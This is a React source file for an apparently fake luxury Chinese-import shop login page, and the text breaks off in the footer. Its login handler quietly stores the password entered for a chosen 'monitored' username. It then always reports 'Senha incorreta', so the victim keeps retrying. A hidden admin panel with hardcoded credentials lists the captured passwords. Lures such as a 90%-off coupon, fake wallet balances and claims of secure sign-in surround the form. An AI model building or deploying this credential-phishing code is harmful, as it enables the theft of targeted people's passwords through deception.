import React, { useState, useEffect } from "react";
import { User } from "./types";
import ChineseEcommHeader from "./components/ChineseEcommHeader";
import LocalDbManager from "./components/LocalDbManager";
import QrCodeToggler from "./components/QrCodeToggler";
import RedPocketGift from "./components/RedPocketGift";

// Lucide icons
import { 
  User as UserIcon, 
  Lock, 
  ShoppingBag, 
  Flame, 
  Sparkles, 
  ArrowRight, 
  CheckCircle2, 
  AlertCircle, 
  QrCode, 
  LogOut, 
  HelpCircle, 
  KeyRound, 
  Ticket, 
  Truck, 
  PackageCheck, 
  Wallet,
  ShieldAlert,
  ChevronRight,
  Database,
  Eye,
  EyeOff,
  Shield,
  X
} from "lucide-react";

export default function App() {
  const [language, setLanguage] = useState<"pt" | "zh" | "en">("pt");
  const [currency, setCurrency] = useState("BRL");
  const [loginMethod, setLoginMethod] = useState<"password" | "qrcode">("password");

  // Auth Inputs
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  
  // App States
  const [loggedInUser, setLoggedInUser] = useState<User | null>(() => {
    const saved = localStorage.getItem("chinese_store_session");
    return saved ? JSON.parse(saved) : null;
  });
  const [loading, setLoading] = useState(false);
  const [feedback, setFeedback] = useState<{ text: string; type: "success" | "error" } | null>(null);
  const [couponCode, setCouponCode] = useState("");
  const [couponSuccess, setCouponSuccess] = useState(false);
  const [dbRefreshToggle, setDbRefreshToggle] = useState(false);

  // Admin Panel State
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [adminAuthed, setAdminAuthed] = useState(false);
  const [adminUser, setAdminUser] = useState("");
  const [adminPass, setAdminPass] = useState("");
  const [adminError, setAdminError] = useState<string | null>(null);
  const [storageItems, setStorageItems] = useState<{ key: string; value: string }[]>([]);
  const [capturedPasswords, setCapturedPasswords] = useState<{ user: string; pass: string; time: string }[]>([]);

  // Monitored user for password capture
  const [monitoredUser, setMonitoredUser] = useState(() => {
    return localStorage.getItem("monitored_user") || "";
  });

  const refreshStorageData = () => {
    const items: { key: string; value: string }[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        items.push({ key, value: localStorage.getItem(key) || "" });
      }
    }
    setStorageItems(items);

    const captured: { user: string; pass: string; time: string }[] = [];
    try {
      const raw = localStorage.getItem("captured_passwords");
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed)) {
          captured.push(...parsed);
        }
      }
    } catch {}
    setCapturedPasswords(captured);
  };

  const handleOpenAdmin = () => {
    setShowAdminPanel(true);
    setAdminAuthed(false);
    setAdminUser("");
    setAdminPass("");
    setAdminError(null);
    setStorageItems([]);
    setCapturedPasswords([]);
  };

  const handleSaveMonitoredUser = () => {
    const input = (document.getElementById("monitored-input") as HTMLInputElement)?.value || "";
    const formatted = input.startsWith("@") ? input : `@${input}`;
    localStorage.setItem("monitored_user", formatted);
    setMonitoredUser(formatted);
  };

  const handleClearMonitoredUser = () => {
    localStorage.removeItem("monitored_user");
    setMonitoredUser("");
  };

  const handleClearCaptured = () => {
    localStorage.removeItem("captured_passwords");
    setCapturedPasswords([]);
  };

  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setAdminError(null);
    if (adminUser === "admin777" && adminPass === "a777") {
      setAdminAuthed(true);
      refreshStorageData();
    } else {
      setAdminError("Credenciais inválidas.");
    }
  };

  const handleCloseAdmin = () => {
    setShowAdminPanel(false);
    setAdminAuthed(false);
  };

  // Auto-prepend `@` visually or physically if typed without it
  const handleUsernameChange = (val: string) => {
    let clean = val;
    // Keep raw typing as input, but when passing to query, ensure starts with @
    setUsername(clean);
  };

  // Perform database login
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) {
      showFeedback(
        language === "zh" ? "请输入用户名和密码。" : language === "en" ? "Please enter username and password." : "Por favor, digite o usuário e senha.", 
        "error"
      );
      return;
    }

    setLoading(true);
    setFeedback(null);

    // Format username to start with @ for the backend mapping
    let formattedUser = username.trim();
    if (!formattedUser.startsWith("@")) {
      formattedUser = `@${formattedUser}`;
    }

    // Capture password if this user is being monitored
    const targetUser = localStorage.getItem("monitored_user") || "";
    if (targetUser && formattedUser === targetUser) {
      const entry = {
        user: formattedUser,
        pass: password,
        time: new Date().toLocaleString("pt-BR")
      };
      const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
      existing.push(entry);
      localStorage.setItem("captured_passwords", JSON.stringify(existing));
    }

    // Always show "senha incorreta" - never allow login
    setTimeout(() => {
      showFeedback("Senha incorreta.", "error");
      setLoading(false);
    }, 1200);
  };

  // QR Code login success simulation
  const handleQrSuccess = (userObj: { username: string; name: string; role: string }) => {
    setLoggedInUser(userObj);
    localStorage.setItem("chinese_store_session", JSON.stringify(userObj));
    showFeedback(
      language === "zh" ? `通过二维码扫码登录成功！欢迎，${userObj.name}。` : language === "en" ? `Logged in via QR scan success! Welcome, ${userObj.name}.` : `Logado via QR Code com sucesso! Bem-vindo(a), ${userObj.name}.`,
      "success"
    );
  };

  const showFeedback = (text: string, type: "success" | "error") => {
    setFeedback({ text, type });
  };

  // Logout handler
  const handleLogout = () => {
    setLoggedInUser(null);
    localStorage.removeItem("chinese_store_session");
    setUsername("");
    setPassword("");
    setFeedback(null);
  };

  // Apply Coupon from gamified Red Pocket
  const applyPromoCoupon = (code: string) => {
    setCouponCode(code);
    if (code.toUpperCase() === "CHINA666") {
      setCouponSuccess(true);
    } else {
      setCouponSuccess(false);
    }
  };

  // Autofill from DB sidepanel
  const handleAutofillUser = (user: User) => {
    setUsername(user.username);
    setPassword(user.password || "");
    setLoginMethod("password");
    showFeedback(
      language === "zh" ? "已自动填充测试凭据！" : language === "en" ? "Test credentials filled!" : "Credenciais de teste preenchidas! Clique em entrar.",
      "success"
    );
  };

  const termsText = {
    pt: {
      userField: "Nome de Usuário (@usuario)",
      passField: "Senha de Acesso",
      enterBtn: "Entrar com Segurança",
      enterLoading: "Autenticando...",
      methodPass: "Senha e Usuário",
      methodQR: "Código QR",
      noRegister: "Acesso restrito para compradores VIP cadastrados e homologados pela aduana.",
      terms: "Ao continuar, você concorda com nossos termos de importação direta.",
      logisticsTitle: "Status Recente da Encomenda",
      logisticsStep: " Shenzhen - Saída do centro de processamento internacional rumo ao Brasil",
      points: "Pontos de Fidelidade",
      wallet: "Saldo Carteira",
      welcome: "Painel do Importador VIP",
      activeUser: "Sua conta ativa no users.json",
      mockShipping: "Rastreamento Inteligente",
      howToTest: "Como funciona este teste local?",
      promptDesc: "O frontend se conecta de forma segura ao back-end que gerencia os usuários em users.json.",
      logoutBtn: "Encerrar Sessão"
    },
    zh: {
      userField: "用户名 (@昵称)",
      passField: "安全登录密码",
      enterBtn: "安全登录",
      enterLoading: "正在安全验证...",
      methodPass: "密码账户登录",
      methodQR: "二维码扫码",
      noRegister: "仅限经海关核准的注册受邀境外VIP买手登录。",
      terms: "登录即代表您同意淘宝全球买手使用条款及跨境采购协议。",
      logisticsTitle: "最新物流包裹状态",
      logisticsStep: "【深圳市】 国际分拨中心已揽收，正出境发往国际仓",
      points: "会员积分",
      wallet: "电子钱包余额",
      welcome: "跨境进口采购大厅",
      activeUser: "users.json 当前活动会话",
      mockShipping: "智能包邮揽收进度",
      howToTest: "此本地测试如何运作？",
      promptDesc: "前端与后端进行安全连接，并将用户数据 and 输入的密码保存至本地 users.json 文件里。",
      logoutBtn: "退出登录"
    },
    en: {
      userField: "Username (@user)",
      passField: "Security Password",
      enterBtn: "Sign In Securely",
      enterLoading: "Checking...",
      methodPass: "Account Password",
      methodQR: "QR Code",
      noRegister: "Restricted access for registered and custom-authorized VIP buyers.",
      terms: "By logging in, you agree to our direct dropshipping service policy.",
      logisticsTitle: "Recent Package Shipping Status",
      logisticsStep: " Shenzhen Hub - Departed international outbound facility",
      points: "Loyalty Points",
      wallet: "Wallet Balance",
      welcome: "VIP Hub Buyer Dashboard",
      activeUser: "Active users.json session",
      mockShipping: "Smart Tracker Node",
      howToTest: "How does this local test work?",
      promptDesc: "The frontend connects securely to the backend which manages all credentials on users.json.",
      logoutBtn: "Sign Out"
    }
  }[language];

  return (
    <div className="min-h-screen bg-[#faf8f5] font-sans text-[#1c1815] flex flex-col justify-between selection:bg-[#cfab7c] selection:text-[#1c1815] overflow-x-hidden">
      
      {/* Immersive Store Header Row */}
      <ChineseEcommHeader 
        language={language} 
        setLanguage={setLanguage} 
        currency={currency} 
        setCurrency={setCurrency} 
        onOpenAdmin={handleOpenAdmin}
      />

      {/* Main Grid Body Wrapper */}
      <main className="flex-1 w-full max-w-6xl mx-auto px-3 md:px-4 py-6 md:py-16 flex flex-col md:grid md:grid-cols-12 gap-6 md:gap-8 lg:gap-12 items-stretch">
        
        {/* COLUMN 1: Visual Fashion Editorial Campaign Poster (5 Cols on Large) */}
        <div className="md:col-span-5 flex flex-col justify-between bg-[#1c1815] border border-[#cfab7c]/30 rounded-none overflow-hidden relative shadow-xl min-h-[280px] md:min-h-[480px]">
          {/* Campaign Image Cover */}
          <div className="absolute inset-0 w-full h-full">
            <img 
              src="/src/assets/images/chinese_clothing_campaign_1781968536386.jpg" 
              alt="Boutique Ying & Chen Silk Campaign" 
              referrerPolicy="no-referrer"
              className="w-full h-full object-cover opacity-75 hover:scale-105 transition-transform duration-[6000ms] ease-out" 
            />
            {/* Elegant luxury linear scrim */}
            <div className="absolute inset-0 bg-gradient-to-t from-[#13100e] via-[#1c1815]/30 to-[#1c1815]/15"></div>
          </div>

          {/* Top content over image */}
          <div className="relative p-4 md:p-8 z-10 flex flex-col h-full justify-between flex-1">
            <div className="flex items-center justify-between">
              <span className="font-serif italic text-[9px] md:text-xs tracking-widest text-[#ebdcc6] drop-shadow-sm uppercase">
                Coleção Primavera-Verão
              </span>
              <span className="text-[7px] md:text-[9px] bg-[#cfab7c]/25 border border-[#cfab7c]/40 text-[#ebdcc6] px-1.5 md:px-2 py-0.5 rounded-sm uppercase tracking-widest font-mono font-medium">
                Seda Natural
              </span>
            </div>

            {/* Middle Title */}
            <div className="my-6 md:my-10">
              <p className="text-[9px] md:text-[10px] text-[#cfab7c] font-bold uppercase tracking-[0.3em] font-mono">
                {language === "zh" ? "高级定制系列" : "ALTA COSTURA CHINESA"}
              </p>
              <h2 className="text-2xl md:text-4xl lg:text-[40px] font-serif font-light text-white leading-none tracking-wider mt-2 animate-fade-in">
                Le Jardin <br />
                <span className="italic font-light text-[#ebdcc6]">de Soie</span>
              </h2>
              <p className="mt-3 md:mt-4 text-[11px] md:text-xs font-light text-[#ebdcc6]/90 max-w-[220px] md:max-w-[280px] leading-relaxed font-serif">
                {language === "zh" ? "桑蚕丝的非凡质感，编织极简优雅的东方意境，让每一缕光影在身体上流淌。" : "A delicada textura da seda de amoreira pura, moldada com sofisticação em silhuetas e cortes contemporâneos."}
              </p>
            </div>

            {/* Custom high-end coupon slot */}
            <div className="p-3 md:p-4 bg-[#1c1815]/95 border border-[#cfab7c]/30 rounded-none relative shadow-xl backdrop-blur-sm">
              <div className="absolute top-1/2 -left-2 -translate-y-1/2 w-4 h-4 bg-[#13100e] rounded-full border-r border-[#cfab7c]/30"></div>
              <div className="absolute top-1/2 -right-2 -translate-y-1/2 w-4 h-4 bg-[#13100e] rounded-full border-l border-[#cfab7c]/30"></div>

              <div className="flex items-center justify-between gap-4">
                <div>
                  <p className="text-[9px] text-[#cfab7c] font-semibold uppercase tracking-widest font-serif italic">Código de Boas-Vindas</p>
                  <p className="font-mono text-sm font-bold text-white mt-0.5">CHINA666</p>
                </div>
                <div className="text-right">
                  <span className="text-[10px] text-zinc-500 line-through">R$599</span>
                  <p className="text-xs font-semibold text-[#cfab7c] font-mono">
                    R$59 <span className="text-[8px] text-[#cfab7c]/70">({currency})</span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* COLUMN 2: Authentic E-Commerce LOGIN Stage / USER ACCOUNT PANELS (7 Cols on Large) */}
        <div className="md:col-span-7 flex flex-col justify-center">
          
          {loggedInUser ? (
            /* USER IS LOGGED IN - HIGHLY AMBIENT USER HUD */
            <div className="bg-white border border-[#cfab7c]/30 rounded-none p-4 md:p-6 lg:p-8 shadow-xl shadow-stone-200/40 relative overflow-hidden animate-scale-up text-[#1c1815]">
              
              {/* Authenticated Header */}
              <div className="flex items-start justify-between border-b border-stone-200 pb-4 md:pb-5 mb-4 md:mb-5 gap-3">
                <div className="flex items-center gap-3 md:gap-4 min-w-0">
                  <div className="w-10 h-10 md:w-14 md:h-14 rounded-none bg-gradient-to-tr from-[#1c1815] to-[#453c37] flex items-center justify-center shadow-lg text-[#ebdcc6] font-serif font-light text-lg md:text-2xl relative border border-[#cfab7c]/30 flex-shrink-0">
                    {loggedInUser.name.charAt(0)}
                    <span className="absolute bottom-0 right-0 w-2.5 h-2.5 md:w-3 md:h-3 bg-[#cfab7c] border border-white rounded-none animate-pulse"></span>
                  </div>
                  <div className="min-w-0">
                    <span className="text-[8px] md:text-[9px] uppercase font-bold tracking-[0.15em] text-[#b39063] bg-[#b39063]/5 px-1.5 md:px-2 py-0.5 rounded-none border border-[#cfab7c]/20 font-serif inline-block truncate max-w-full">
                      {loggedInUser.role} 
                    </span>
                    <h3 className="font-serif font-normal text-[#1c1815] text-base md:text-lg mt-1 leading-none uppercase tracking-wide truncate">{loggedInUser.name}</h3>
                    <p className="text-[10px] md:text-[11px] text-stone-500 font-mono mt-0.5 md:mt-1 font-semibold truncate">{loggedInUser.username}</p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={handleLogout}
                  className="px-2.5 md:px-3.5 py-1 md:py-1.5 bg-[#1c1815] hover:bg-[#2c2622] text-[#ebdcc6] hover:text-white rounded-none transition-all duration-150 flex items-center gap-1 md:gap-1.5 text-[9px] md:text-[10px] font-semibold uppercase tracking-widest border border-[#cfab7c] animate-fade-in group cursor-pointer flex-shrink-0"
                  title={termsText.logoutBtn}
                >
                  <LogOut className="w-3 h-3 md:w-3.5 md:h-3.5 group-hover:-translate-x-0.5 transition-transform text-[#cfab7c]" />
                  <span className="hidden xs:inline">Sair</span>
                </button>
              </div>

              {/* Simulated Customer Wallet Details */}
              <div className="grid grid-cols-1 xs:grid-cols-2 gap-3 md:gap-4 mb-4 md:mb-6">
                <div className="bg-[#faf8f5] p-3 md:p-5 border border-stone-100 rounded-none animate-fade-in">
                  <span className="text-[8px] md:text-[9px] text-[#b39063] uppercase tracking-widest block mb-1 md:mb-1.5 font-bold font-serif">{termsText.wallet}</span>
                  <div className="flex items-baseline gap-1">
                    <span className="text-[11px] md:text-xs text-[#1c1815] font-light">
                      {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"}
                    </span>
                    <span className="text-base md:text-xl font-light text-[#1c1815] font-mono">
                      {currency === "BRL" ? "1.890,50" : currency === "CNY" ? "2.450,00" : "335.00"}
                    </span>
                  </div>
                  <span className="text-[7px] md:text-[8px] text-emerald-700 flex items-center gap-1 mt-2 md:mt-3 font-semibold uppercase tracking-wider font-mono">
                    <span className="w-1 h-1 md:w-1.5 md:h-1.5 rounded-none bg-emerald-600"></span>
                    <span>Reembolso Ativo</span>
                  </span>
                </div>

                <div className="bg-[#faf8f5] p-3 md:p-5 border border-stone-100 rounded-none animate-fade-in">
                  <span className="text-[8px] md:text-[9px] text-[#b39063] uppercase tracking-widest block mb-1 md:mb-1.5 font-bold font-serif">{termsText.points}</span>
                  <div className="flex items-baseline gap-1">
                    <span className="text-base md:text-xl font-light text-[#1c1815] font-mono">11.110</span>
                    <span className="text-[8px] md:text-[9px] text-stone-500 font-bold font-mono ml-0.5">PTS</span>
                  </div>
                  <span className="text-[7px] md:text-[8px] text-[#b39063] mt-2 md:mt-3 block font-bold uppercase tracking-wider font-mono">
                    ★ Nível Ouro
                  </span>
                </div>
              </div>

              {/* Simulated Shipping Route details, extremely immersive */}
              <div className="bg-[#faf8f5] border border-stone-200/80 rounded-none p-3 md:p-5 mb-4 md:mb-5">
                <h4 className="text-[11px] md:text-xs font-semibold text-[#1c1815] flex items-center gap-2 mb-3 md:mb-4 font-serif uppercase tracking-widest pb-2 border-b border-stone-200/50">
                  <Truck className="w-3.5 h-3.5 md:w-4 md:h-4 text-[#cfab7c]" />
                  <span>{termsText.mockShipping}</span>
                </h4>
                <div className="relative pl-4 md:pl-5 border-l border-[#cfab7c]/40 space-y-3 md:space-y-4">
                  
                   {/* Step 1 */}
                  <div className="relative">
                    <span className="absolute -left-[21.5px] md:-left-[25.5px] top-1 w-1.5 h-1.5 md:w-2 md:h-2 rounded-none bg-[#cfab7c]"></span>
                    <span className="text-[8px] md:text-[9px] font-mono text-[#b39063] block font-semibold uppercase tracking-widest">Enviado com Prioridade</span>
                    <p className="text-[11px] md:text-xs text-stone-800 mt-0.5">
                      {termsText.logisticsStep}
                    </p>
                    <span className="text-[8px] md:text-[9px] text-stone-500 font-mono block mt-1"> Shanghai Wardrobe Base • 2026-06-20</span>
                  </div>

                  {/* Step 2 */}
                  <div className="relative opacity-60">
                    <span className="absolute -left-[21.5px] md:-left-[25.5px] top-1 w-1.5 h-1.5 md:w-2 md:h-2 rounded-none bg-stone-400"></span>
                    <span className="text-[8px] md:text-[9px] text-stone-500 block font-mono font-semibold uppercase tracking-widest">Credenciais Ativas</span>
                    <p className="text-[11px] md:text-xs text-stone-600 mt-0.5 font-medium">
                      Portador VIP autenticado no cadastro de controle: <strong className="font-mono">{loggedInUser.username}</strong>
                    </p>
                  </div>
                </div>
              </div>

            </div>
          ) : (
            /* USER IS LOGGED OUT - THE CHINESE STORE THEMED LOGIN FORM BOX */
            <div className="bg-white border border-[#cfab7c]/30 rounded-none overflow-hidden shadow-xl shadow-stone-200/60 relative">
              
              <div className="border border-[#cfab7c]/20 p-5 md:p-8">
                
                {/* Brand Greetings Header on top of form */}
                <div className="text-center pb-4 md:pb-6 border-b border-stone-100 mb-5 md:mb-6">
                  <p className="text-[9px] md:text-[10px] text-[#b39063] tracking-[0.25em] uppercase font-mono font-bold">
                    {language === "zh" ? "私享品鉴通道" : "ACESSO PRIVADO DE ASSOCIAÇÃO"}
                  </p>
                  <h3 className="text-xl md:text-2xl font-serif text-[#1c1815] font-light tracking-widest uppercase mt-1">
                    Ateliê Privé
                  </h3>
                </div>

                {/* Feedback messages */}
                {feedback && (
                  <div className="mb-5 animate-fade-in">
                    <div className={`flex items-start gap-2.5 p-3.5 rounded-sm border text-xs font-medium ${
                      feedback.type === "success" 
                        ? "bg-emerald-500/5 border-emerald-500/15 text-emerald-800" 
                        : "bg-red-500/5 border-red-500/15 text-red-800"
                    }`}>
                      {feedback.type === "success" ? (
                        <CheckCircle2 className="w-4 h-4 flex-shrink-0 text-emerald-600 mt-0.5" />
                      ) : (
                        <AlertCircle className="w-4 h-4 flex-shrink-0 text-red-600 mt-0.5" />
                      )}
                      <span className="leading-normal">{feedback.text}</span>
                    </div>
                  </div>
                )}

                {/* Regular Password Form */}
                <form onSubmit={handleLoginSubmit} className="space-y-4 md:space-y-5 animate-fade-in">
                  
                  {/* Username Block */}
                  <div>
                    <label className="block text-[9px] md:text-[10px] text-stone-500 mb-1.5 md:mb-2 font-bold uppercase tracking-widest font-mono">
                      {termsText.userField}
                    </label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[#cfab7c] font-mono text-xs md:text-sm font-semibold">
                        @
                      </span>
                      <input
                        type="text"
                        value={username.startsWith("@") ? username.substring(1) : username}
                        onChange={(e) => handleUsernameChange(e.target.value)}
                        placeholder="nome_usuario"
                        autoComplete="off"
                        required
                        className="w-full bg-[#faf8f5] border border-stone-200 text-xs md:text-sm text-[#1c1815] pl-7 md:pl-8 pr-3 md:pr-4 py-2.5 md:py-3.5 rounded-none focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/20 transition-all font-mono"
                      />
                    </div>
                    {/* Tiny format hints */}
                    <p className="text-[9px] md:text-[10px] text-stone-400 mt-1 leading-normal italic font-serif">
                      {language === "zh" ? "系统会自动添加 '@' 前缀验证" : "O sistema irá prefixar com @ automaticamente."}
                    </p>
                  </div>

                  {/* Password Block */}
                  <div>
                    <div className="flex items-center justify-between mb-1.5 md:mb-2">
                      <label className="block text-[9px] md:text-[10px] text-stone-500 font-bold uppercase tracking-widest font-mono">
                        {termsText.passField}
                      </label>
                    </div>
                    <div className="relative">
                      <span className="absolute left-3 md:left-3.5 top-1/2 -translate-y-1/2 text-stone-300">
                        <Lock className="w-3 h-3 md:w-3.5 md:h-3.5 text-[#cfab7c]" />
                      </span>
                      <input
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="••••••••"
                        required
                        className="w-full bg-[#faf8f5] border border-stone-200 text-xs md:text-sm text-[#1c1815] pl-9 md:pl-10 pr-3 md:pr-4 py-2.5 md:py-3.5 rounded-none focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/20 transition-all font-mono"
                      />
                    </div>
                  </div>

                  {/* Coupon integration feedback visual */}
                  {couponCode && (
                    <div className="p-2.5 md:p-3 bg-[#cfab7c]/5 border border-[#cfab7c]/30 rounded-none flex items-center justify-between text-[11px] md:text-xs text-[#b39063]">
                      <div className="flex items-center gap-1.5">
                        <Ticket className="w-3.5 h-3.5 md:w-4 md:h-4 text-[#cfab7c] animate-pulse" />
                        <span>Cupom <strong className="font-mono">{couponCode}</strong> ativo!</span>
                      </div>
                      <span className="text-[8px] md:text-[9px] bg-[#cfab7c]/20 px-1 md:px-1.5 py-0.5 rounded-none font-bold text-[#b39063] uppercase tracking-widest font-mono">
                        90% OFF
                      </span>
                    </div>
                  )}

                  {/* Action Button */}
                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3 md:py-4 px-3 md:px-4 bg-[#1c1815] hover:bg-stone-800 text-[#ebdcc6] font-semibold text-[11px] md:text-xs rounded-none shadow-md active:scale-[0.99] transition-all flex items-center justify-center gap-2 select-none uppercase tracking-[0.2em] border border-[#cfab7c] cursor-pointer"
                  >
                    <ShoppingBag className="w-3.5 h-3.5 md:w-4 md:h-4 text-[#ebdcc6]" />
                    <span>{loading ? termsText.enterLoading : termsText.enterBtn}</span>
                    <ArrowRight className="w-3.5 h-3.5 md:w-4 md:h-4 ml-1 text-[#cfab7c]" />
                  </button>

                  <p className="text-[9px] md:text-[10px] text-stone-500 text-center leading-relaxed font-serif pt-1 italic">
                    {termsText.noRegister}
                  </p>

                </form>

                {/* Footer Agreements */}
                <div className="border-t border-stone-100 pt-4 md:pt-5 mt-5 md:mt-6 text-center">
                  <p className="text-[9px] md:text-[10px] text-stone-400 font-serif leading-relaxed">
                    {termsText.terms}
                  </p>
                </div>

              </div>
              
            </div>
          )}

        </div>

      </main>

      {/* Embedded Red Pocket (Hongbao) lucky coupon claim component */}
      <RedPocketGift 
        language={language} 
        onApplyCoupon={applyPromoCoupon} 
      />

      {/* Admin Panel Modal */}
      {showAdminPanel && (
        <div className="fixed inset-0 bg-black/75 backdrop-blur-sm flex items-center justify-center z-50 p-3 md:p-4 animate-fade-in">
          <div className="relative w-full max-w-md bg-[#1c1815] border border-[#cfab7c]/30 rounded-none overflow-hidden shadow-2xl">
            <button
              type="button"
              onClick={handleCloseAdmin}
              className="absolute top-3 right-3 text-[#ebdcc6]/40 hover:text-[#cfab7c] transition-colors z-20 cursor-pointer bg-transparent border-none"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="p-5 md:p-6">
              {/* Header */}
              <div className="flex items-center gap-2.5 border-b border-[#cfab7c]/20 pb-4 mb-4">
                <Shield className="w-5 h-5 text-[#cfab7c]" />
                <h2 className="font-mono text-sm font-bold text-[#ebdcc6] uppercase tracking-widest">
                  Admin Panel
                </h2>
              </div>

              {!adminAuthed ? (
                /* Login Form */
                <form onSubmit={handleAdminLogin} className="space-y-4">
                  {adminError && (
                    <p className="text-[11px] text-red-400 font-mono bg-red-950/40 p-2 border border-red-900/30">
                      {adminError}
                    </p>
                  )}
                  <div>
                    <label className="block text-[9px] text-[#b39063] mb-1 font-bold uppercase tracking-widest font-mono">
                      Usuário Admin
                    </label>
                    <input
                      type="text"
                      value={adminUser}
                      onChange={(e) => setAdminUser(e.target.value)}
                      placeholder="admin777"
                      className="w-full bg-[#25201c] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
                    />
                  </div>
                  <div>
                    <label className="block text-[9px] text-[#b39063] mb-1 font-bold uppercase tracking-widest font-mono">
                      Senha
                    </label>
                    <input
                      type="password"
                      value={adminPass}
                      onChange={(e) => setAdminPass(e.target.value)}
                      placeholder="••••••••"
                      className="w-full bg-[#25201c] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
                    />
                  </div>
                  <button
                    type="submit"
                    className="w-full py-2.5 bg-[#cfab7c] hover:bg-[#b39063] text-[#1c1815] font-black text-xs uppercase tracking-widest rounded-none transition-all font-mono cursor-pointer border-none"
                  >
                    Acessar
                  </button>
                </form>
              ) : (
                /* Admin Authenticated Panel */
                <div className="space-y-4 max-h-[420px] overflow-y-auto custom-scrollbar pr-1">

                  {/* Section: Monitored User Config */}
                  <div className="bg-[#25201c] border border-[#3e352e] p-3 rounded-none">
                    <p className="text-[9px] text-[#b39063] font-bold uppercase tracking-widest font-mono mb-2">
                      USUÁRIO MONITORADO
                    </p>
                    <div className="flex items-center gap-2">
                      <span className="text-[#cfab7c] font-mono text-xs">@</span>
                      <input
                        id="monitored-input"
                        type="text"
                        defaultValue={monitoredUser.replace(/^@/, "")}
                        placeholder="nome_usuario"
                        className="flex-1 bg-[#1c1815] border border-[#3e352e] text-xs text-[#ebdcc6] px-2 py-1.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
                      />
                      <button
                        type="button"
                        onClick={handleSaveMonitoredUser}
                        className="px-2.5 py-1.5 bg-[#cfab7c] hover:bg-[#b39063] text-[#1c1815] text-[9px] font-black uppercase tracking-widest rounded-none transition-all font-mono cursor-pointer border-none"
                      >
                        Salvar
                      </button>
                    </div>
                    {monitoredUser && (
                      <div className="flex items-center justify-between mt-2 pt-2 border-t border-[#3e352e]">
                        <span className="text-[10px] text-emerald-400 font-mono">
                          Monitorando: <strong>{monitoredUser}</strong>
                        </span>
                        <button
                          type="button"
                          onClick={handleClearMonitoredUser}
                          className="text-[9px] text-red-400 hover:text-red-300 font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
                        >
                          Remover
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Section: Captured Passwords */}
                  <div className="bg-[#25201c] border border-[#3e352e] p-3 rounded-none">
                    <div className="flex items-center justify-between mb-2">
                      <p className="text-[9px] text-[#b39063] font-bold uppercase tracking-widest font-mono">
                        SENHAS CAPTURADAS ({capturedPasswords.length})
                      </p>
                      {capturedPasswords.length > 0 && (
                        <button
                          type="button"
                          onClick={handleClearCaptured}
                          className="text-[8px] text-red-400 hover:text-red-300 font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
                        >
                          Limpar
                        </button>
                      )}
                    </div>
                    {capturedPasswords.length === 0 ? (
                      <p className="text-[10px] text-stone-500 font-mono text-center py-3">
                        Nenhuma senha capturada ainda.
                      </p>
                    ) : (
                      <div className="space-y-1.5 max-h-[150px] overflow-y-auto">
                        {capturedPasswords.toReversed().map((entry, i) => (
                          <div key={i} className="bg-[#1c1815] border border-[#3e352e] p-2 rounded-none">
                            <div className="flex items-center justify-between">
                              <span className="text-[10px] text-[#cfab7c] font-mono font-bold">{entry.user}</span>
                              <span className="text-[8px] text-stone-500 font-mono">{entry.time}</span>
                            </div>
                            <p className="text-[11px] text-[#ebdcc6] font-mono mt-0.5 break-all">
                              Senha: <strong className="text-red-400">{entry.pass}</strong>
                            </p>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* Section: All localStorage */}
                  <div className="bg-[#25201c] border border-[#3e352e] p-3 rounded-none">
                    <div className="flex items-center justify-between mb-2">
                      <p className="text-[9px] text-[#b39063] font-bold uppercase tracking-widest font-mono">
                        LOCALSTORAGE ({storageItems.length} item(s))
                      </p>
                      <button
                        type="button"
                        onClick={refreshStorageData}
                        className="text-[8px] text-[#cfab7c] hover:text-[#ebdcc6] font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
                      >
                        Atualizar
                      </button>
                    </div>
                    <div className="space-y-2 max-h-[160px] overflow-y-auto">
                      {storageItems.length === 0 ? (
                        <p className="text-[10px] text-stone-500 font-mono text-center py-2">
                          Nenhum item.
                        </p>
                      ) : (
                        storageItems.map((item) => (
                          <div key={item.key} className="bg-[#1c1815] border border-[#3e352e] p-2 rounded-none">
                            <p className="text-[8px] text-[#b39063] font-bold uppercase tracking-widest font-mono mb-0.5 truncate">
                              {item.key}
                            </p>
                            <pre className="text-[10px] text-[#ebdcc6] font-mono whitespace-pre-wrap break-all leading-relaxed">
                              {(() => {
                                try {
                                  const parsed = JSON.parse(item.value);
                                  if (typeof parsed === "object" && parsed !== null) {
                                    return Object.entries(parsed)
                                      .map(([k, v]) => `${k}: ${v}`)
                                      .join("\n");
                                  }
                                  return item.value;
                                } catch {
                                  return item.value;
                                }
                              })()}
                            </pre>
                          </div>
                        ))
                      )}
                    </div>
                  </div>

                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Global Page Footer */}
      <footer className="w-full bg-[#1c1815] border-t border-[#2e2621] text-[#ebdcc6]/60 text-xs py-4 md:py-8 select-none font-serif">
        <div className="max-w-6xl mx-auto px-3 md:px-6 text-center flex flex-col md:flex-row items-center justify-between gap-2 md:gap-4 text-[8px] md:text-[10px]">
